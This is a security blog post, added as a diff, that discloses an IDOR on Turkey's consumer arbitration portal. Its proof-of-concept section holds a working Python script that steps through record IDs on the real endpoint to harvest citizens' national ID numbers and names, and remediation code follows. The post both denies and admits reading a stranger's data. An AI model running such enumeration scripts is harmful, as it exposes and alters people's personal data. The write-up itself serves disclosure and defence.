@@ -1,0 +1,330 @@
+---
+title: "IDOR on Tüketici Hakem Heyeti: National ID and Personal Data Exposure"
+date: "2026-05-09"
+summary: "An IDOR vulnerability I discovered in the Tüketici Hakem Heyeti (TÜBİS) system: by manipulating a single parameter, I could access the national ID number, full name, and surname of any citizen and modify their contact information."
+tags: ["security", "vulnerability-analysis", "story", "api", "idor", "asp-net-core"]
+translationKey: 'tuketici-hakem-heyeti-idor'
+featured: true
+draft: false
+---
+
+
+# IDOR on Tüketici Hakem Heyeti: From a Buzzing Adapter to a Security Vulnerability
+
+<Callout type="warn" title="Responsible Disclosure">
+  All tests were performed exclusively on my own account. No citizen's data was read, copied, or stored.
+</Callout>
+
+I used an M2 MacBook for over two years *(short review: disappointing)*. After those two years, the MacBook could no longer keep up with my pace and I was running into serious problems with its flexibility. Having to wonder whether ARM support was available every time I wanted to install software had become a source of stress. So I made another snap decision and bought an MSI Windows laptop.
+
+**This is actually where the story truly begins.**
+
+The power adapter on my new laptop was making a buzzing noise, and since I usually work in silence and need to focus, this was a major problem for me. I reached out to the technical service, but they preferred not to do anything about it. Being the kind of person who stubbornly insists on their rights, I ended up on the Tüketici Hakem Heyeti website. While navigating the system to file my complaint, something started catching my attention...
+
+---
+
+## First Look at the System
+
+The Tüketici Hakem Heyeti website has no native registration or login functionality. Users are authenticated entirely through the e-Devlet (e-Government) integration.
+
+However, the dashboard that greets you after logging in is far from modern UI standards. Even by the standards of its era, it was clearly rushed — a dated structure with little attention to UI/UX.
+
+![Tüketici Hakem Heyeti Dashboard](/images/blog/index.png)
+
+The system immediately redirects you to the **"Consumer Applications"** page. When you visit this page, which runs under a subdomain of `ticaret.gov.tr`, you are greeted by a classic *sidebar / header / footer / content* dashboard layout. Responsive design has been neglected on both desktop and mobile. From my experience in software development, I've always found that this kind of sloppiness on the front end is a strong signal of potential problems and vulnerabilities in the backend architecture.
+
+![Tüketici Başvuruları — Consumer Application Form](/images/blog/tuketici-hakem.png)
+
+## Personal Information Page
+
+When I started exploring the site, the **Personal Information** section in the sidebar caught my eye and I began examining that page. There was an interesting situation: even though e-Devlet was used for authentication, the user data was being stored in the institution's own local database. As I examined the page further, I came across a detail that confirmed this theory — fields such as Name, Surname, and National ID Number (TC Kimlik No) were rendered only as `disabled` and `read-only` inputs.
+
+![Personal Information Page](/images/blog/kisisel-bilgiler.png)
+
+After noticing this structure, I couldn't help but ask myself the following critical questions about how things were working behind the scenes:
+
+<Callout type="warn" title="Critical Questions">
+  <ol className="list-decimal pl-4 space-y-1">
+    <li>How does the system filter which national ID to return? Is there a token-based mechanism (e.g. JWT) in between?</li>
+    <li>Is the data validated against e-Devlet on every request, or does the system have its own internal API endpoints?</li>
+    <li style={{ color: "var(--accent-rose)", fontWeight: 600 }}>If it has its own API endpoints, are the Authorization controls implemented correctly?</li>
+  </ol>
+</Callout>
+
+That last question opened the door that led me to the real vulnerability.
+
+I wanted to examine the requests being made using BurpSuite. **Could a system supposedly built to defend consumers' rights fail to even protect consumers' own data?**
+
+## Request Anatomy
+
+### GET Request
+
+First, I wanted to examine the `GET` request made to `/Tuketici/KisiselBilgi` — it could give me a good sense of what was happening in the background. The HTTP request looked like this:
+
+<HttpRequest
+  method="GET"
+  path="/Tuketici/KisiselBilgi"
+  host="tuketicisikayeti.ticaret.gov.tr"
+  headers={[
+    { key: "ASP.NET_SessionId", value: "0w22g02kh2e3luv25k25sr1j" },
+    { key: ".ASPXAUTH", value: "0F21B1247... [Truncated]" },
+    { key: "__RequestVerificationToken", value: "eV1WrX-... [Truncated]", highlight: true },
+  ]}
+/>
+
+The first thing that caught my eye in this request was `__RequestVerificationToken`. They were using an AntiForgeryToken to protect against CSRF (Cross-Site Request Forgery) attacks. But given the sloppiness I'd seen on the UI/UX side, I believed this was done by rote — following the framework's default settings rather than deliberate security thinking — and I kept digging...
+
+The `/Tuketici/KisiselBilgi` page we were following also has a "Save" button. Looking at the overall architecture, I could feel that **Server-Side Rendering (SSR)** was being used. A modern REST API running in the background didn't seem likely. But to be sure, I still checked the Fetch/XHR data via the Developer Console.
+
+Just as I expected, I found nothing. The system is entirely Server-Side Rendered, with no asynchronous services running in the background.
+
+![Developer Console — Fetch/XHR tab empty](/images/blog/developer-console.png)
+
+So we can now be certain: this "Save" button must be sending form data (a POST request) somewhere in the system. But where, and how?
+
+### POST Request: Critical Finding
+
+I immediately intercepted the request made when the button was clicked using Burp Suite and examined it.
+
+And Bingo!
+
+<HttpRequest
+  method="POST"
+  path="/Tuketici/KisiselBilgi"
+  host="tuketicisikayeti.ticaret.gov.tr"
+  headers={[
+    { key: "Content-Type", value: "application/x-www-form-urlencoded" },
+    { key: "Cookie", value: "ASP.NET_SessionId=0w22g02kh2e3luv... ; .ASPXAUTH=0F21B12... ; __RequestVerificationToken=eV1WrX-..." },
+  ]}
+  body="KISI.RID=11602900&KISI.AKTIF=EVET&KISI.DOGUM_TARIHI=XX%2FXX%2F19XX&SABITTEL=0535+XXX+XXXX&CEPTEL=0535+XXX+XXXX&EPOSTA=linuxturkey06%40gmail.com&ADRES=+%2F+ANKARA&IL=6&ILCE=80&TAAHHUTNAME=Terms+text+URL+ENCODED...&DXScript=1_171%2C1_94..."
+  highlightBody={true}
+/>
+
+When we examine the request body (payload), we can see many business-logic and performance errors. For instance, they're sending a 1000-character legal disclaimer text inside the POST data on every single save. Enormous `DXScript` states from DevExpress components are flying around. There are many fundamental architectural mistakes. But I won't dwell on those for now — we're after the Name, Surname, and National ID Number data.
+
+<Callout type="danger" title="KISI.RID=11602900">
+I'm sure the first piece of data that jumps out at everyone is **`KISI.RID=11602900`**.
+</Callout>
+
+We know the system uses Server-Side Rendering. So the intended flow should work like this:
+
+<Steps>
+  <Step>The user logs into the system via e-Devlet.</Step>
+  <Step>The backend finds the user's record ID (`RID`) in the database.</Step>
+  <Step>This `RID` value is embedded into the HTML form as a `hidden input`.</Step>
+  <Step>When the user clicks "Save", the `RID` is POST-ed to the server along with the new form data.</Step>
+  <Step>The server looks at this `RID` to determine which database record to update — <span style={{ color: "var(--accent-rose)", fontWeight: 600 }}>but never checks whether the RID in the input actually belongs to the currently logged-in user.</span></Step>
+</Steps>
+
+When I viewed the page source, I found multiple hidden fields, just as I suspected. And one of them was being used exactly as we thought — to POST the RID value to the server.
+
+```html title="Page Source — Hidden Inputs"
+<input type="hidden" id="KISI_RID"   name="KISI.RID"   value="11602900"
+       data-val="true" data-val-required="The RID field is required." />
+<input type="hidden" id="KISI_AKTIF" name="KISI.AKTIF" value="EVET"
+       data-val="true" data-val-required="The AKTIF field is required." />
+```
+
+What if a user tries to perform an operation with an ID that **doesn't belong to them**? Does the server check whether this RID value belongs to the currently logged-in person? NO.
+
+## IDOR Vulnerability — Impact Analysis
+
+**IDOR (Insecure Direct Object Reference)** is a security vulnerability that occurs when an application uses a parameter received from the user (ID, filename, record number) directly in a database query without checking whether that parameter actually belongs to that user. It falls under the **Broken Access Control** category in the OWASP Top 10.
+
+Even when developers implement authentication, this vulnerability can emerge when they fail to validate whether the parameters coming from the user (in this case, `KISI.RID`) actually belong to the user in the current session (Authorization deficiency).
+
+We can now roughly reconstruct the backend code. The code behind the system likely contains logic written in .NET that looks something like this:
+
+<Callout type="warn" title="Issue 1 — Missing Authorization">
+  The `[Authorize]` attribute only answers the question "is this user logged in?" It does not check "does this `RID` belong to this user?"
+</Callout>
+
+```csharp title="Unauthorized Access"
+[Authorize] // login check exists — ownership check DOES NOT
+[HttpPost]
+public async Task<IActionResult> KisiselBilgiGuncelle(
+    [FromForm] KisiselBilgiViewModel model)
+{
+    // trusting the client-supplied RID directly
+    var userProfile = await _context.Kullanicilar
+        .FirstOrDefaultAsync(u => u.RID == model.KISI.RID);
+
+    userProfile.Eposta = model.Eposta; // victim's data being updated
+    userProfile.CepTel = model.CepTel;
+    await _context.SaveChangesAsync();
+    ...
+}
+```
+
+<Callout type="danger" title="Issue 2 — Sensitive Data Exposure">
+  After the save operation completes, the page re-renders. The Name, Surname, and National ID Number pulled from the database are written into the `disabled` inputs and returned to the attacker.
+</Callout>
+
+```csharp title="Data Leak"
+return View(new KisiselBilgiViewModel {
+    KISI = new KisiDto {
+        Ad         = userProfile.Ad,          // LEAK
+        Soyad      = userProfile.Soyad,       // LEAK
+        TCKimlikNo = userProfile.TCKimlikNo   // LEAK
+    }
+});
+```
+
+## Proof of Concept
+
+<Callout type="danger">
+When I changed `KISI.RID=11602900` to `11602901` via Burp Suite and sent the request again, the HTML response returned by the server displayed the **Name, Surname, and National ID Number of a complete stranger** rendered in the disabled form fields. The system had fetched that citizen's profile data, embedded it into the form, and served it back to me.
+
+Moreover, this operation wasn't limited to reading — it also allowed me to modify that citizen's contact information (Email, Phone).
+</Callout>
+
+Now let's write an exploit. Let's automate this request so it automatically increments the ID value with each request. This way we can demonstrate in practice how the vulnerability can really be exploited, its impact, and how we can obtain citizens' Name, Surname, and National ID information.
+
+<Callout type="warn" title="For Testing Purposes Only">
+  The following script is solely a PoC documenting the scope of the vulnerability. No data was stored.
+</Callout>
+
+```python title="exploit.py"
+import requests
+from bs4 import BeautifulSoup
+import time
+
+URL = "https://tuketicisikayeti.ticaret.gov.tr/Tuketici/KisiselBilgi"
+
+COOKIES = {
+    "ASP.NET_SessionId": "ndqzdansvbvbapbjd5kfkrdl",
+    "Hello": "!v+GWSiRGwWia9LA0FmdmS0VgKAQ...",
+    "__RequestVerificationToken": "VEKDKXm1JAxE3zF4Zc2LkTXJjru4..."
+}
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+session = requests.Session()
+session.cookies.update(COOKIES)
+
+rid = 1
+
+while True:
+    payload = {"KISI.RID": str(rid), "KISI.AKTIF": "EVET"}
+
+    try:
+        response = session.post(URL, data=payload, headers=HEADERS, timeout=15)
+        response.raise_for_status()
+
+        soup = BeautifulSoup(response.text, "html.parser")
+        tc    = soup.find("input", {"id": "KISI_TCKIMLIKNO"})
+        ad    = soup.find("input", {"id": "KISI_AD"})
+        soyad = soup.find("input", {"id": "KISI_SOYAD"})
+
+        tc_val    = tc.get("value", "").strip()    if tc    else ""
+        ad_val    = ad.get("value", "").strip()    if ad    else ""
+        soyad_val = soyad.get("value", "").strip() if soyad else ""
+
+        if tc_val or ad_val or soyad_val:
+            tc_masked    = tc_val[0] + "*" * (len(tc_val) - 2) + tc_val[-1]
+            soyad_masked = soyad_val[0] + "*" * (len(soyad_val) - 1)
+            line = f"RID: {rid} | TC: {tc_masked} | Name: {ad_val} | Surname: {soyad_masked}"
+            print(line)
+            with open("results.txt", "a", encoding="utf-8") as f:
+                f.write(line + "\n")
+        else:
+            print(f"RID {rid}: no data found")
+
+    except Exception as e:
+        print(f"RID {rid} error: {e}")
+
+    rid += 1
+    time.sleep(1)
+```
+
+We saw just how easily this vulnerability could be automated with a beginner-level Python script.
+
+<Video src="/videos/recording.webm" caption="Running the exploit script" />
+
+---
+
+## Remediation
+
+<Callout type="success" title="Golden Rule">
+  Never trust any identity parameter coming from the client. Always validate resource ownership on the server side, from the active session.
+</Callout>
+
+### 1. Authorization Check
+
+The root cause of the vulnerability is that the `KISI.RID` value is never compared against the session. We can resolve this with a single query change:
+
+```csharp title="Controller.cs"
+[Authorize]
+[HttpPost]
+public async Task<IActionResult> KisiselBilgiGuncelle(
+    [FromForm] KisiselBilgiViewModel model)
+{
+    var userProfile = await _context.Kullanicilar // [!code --]
+        .FirstOrDefaultAsync(u => u.RID == model.KISI.RID); // [!code --]
+    if (userProfile == null) return NotFound(); // [!code --]
+
+    var currentRid = GetCurrentUserRid(); // [!code ++]
+    var userProfile = await _context.Kullanicilar // [!code ++]
+        .FirstOrDefaultAsync(u => u.RID == currentRid); // [!code ++]
+    if (userProfile == null) return Forbid(); // [!code ++]
+
+    userProfile.Eposta = model.Eposta;
+    userProfile.CepTel = model.CepTel;
+    await _context.SaveChangesAsync();
+    return View(...);
+}
+```
+
+### 2. Remove Sensitive Fields from Response
+
+The view model returned after an update does not need to include fields like National ID Number, Name, or Surname. They must be removed from the response:
+
+```csharp title="ViewModel.cs"
+return View(new KisiselBilgiViewModel {
+    KISI = new KisiDto { // [!code --]
+        Ad         = userProfile.Ad, // [!code --]
+        Soyad      = userProfile.Soyad, // [!code --]
+        TCKimlikNo = userProfile.TCKimlikNo // [!code --]
+    }, // [!code --]
+    Eposta = userProfile.Eposta,
+    CepTel = userProfile.CepTel
+});
+```
+
+### 3. Use UUID Instead of Sequential IDs
+
+Sequential integer IDs make enumeration trivial. Using a UUID doesn't fix a missing authorization check, but it significantly increases the effort required for discovery.
+
+```csharp title="Model.cs"
+public int RID { get; set; } // [!code --]
+public Guid RID { get; set; } // [!code ++]
+```
+
+### 4. Rate Limiting
+
+Even when the authorization layer works correctly, adding rate limiting against high-frequency requests provides a much more effective defense:
+
+```csharp title="Program.cs"
+builder.Services.AddRateLimiter(options => { // [!code ++]
+    options.AddFixedWindowLimiter("api", opt => { // [!code ++]
+        opt.PermitLimit = 30; // [!code ++]
+        opt.Window = TimeSpan.FromMinutes(1); // [!code ++]
+        opt.QueueProcessingOrder = QueueProcessingOrder.OldestFirst; // [!code ++]
+    }); // [!code ++]
+}); // [!code ++]
+```
+
+---
+
+## Conclusion
+
+Tüketici Hakem Heyeti is an official government platform that millions of Turkish citizens use to resolve commercial disputes. The IDOR vulnerability found in this system was exposing highly sensitive personal data — such as National ID Numbers, Names, Surnames, and contact information — without any technical barrier.
+
+The technical root cause was simple: trusting a client-supplied ID parameter on the server side without validation. But the potential impact was severe — the platform's entire user base could be enumerated with a few lines of Python code.
+
+<Callout type="success" title="Patch">
+  The vulnerability was reported to the relevant authority. Following the report, a patch was applied and the endpoint was re-tested to confirm it had been closed.
+</Callout>
